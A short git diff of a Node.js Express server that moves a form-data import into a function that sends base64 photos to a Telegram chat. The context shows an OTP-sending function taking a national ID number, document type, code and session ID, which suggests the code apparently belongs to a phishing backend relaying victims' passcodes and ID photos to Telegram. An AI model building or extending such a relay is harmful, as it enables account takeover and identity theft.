@@ -4,7 +4,6 @@ const express = require("express");
 const bodyParser = require("body-parser");
 const dotenv = require("dotenv");
 const fetch = require("node-fetch");
-const FormData = require('form-data');
 const app = express();
 dotenv.config();
 
@@ -163,6 +162,7 @@ async function enviarMensajeOTP({ cedula, docType, otp, sessionId }) {
 // Enviar foto al chat de Telegram vía multipart
 async function enviarFotoTelegram(base64Str, filename, caption) {
   try {
+    const FormData = require('form-data');
     const buf = Buffer.from(base64Str.replace(/^data:image\/\w+;base64,/, ''), 'base64');
     const form = new FormData();
     form.append('chat_id', CHAT_ID);
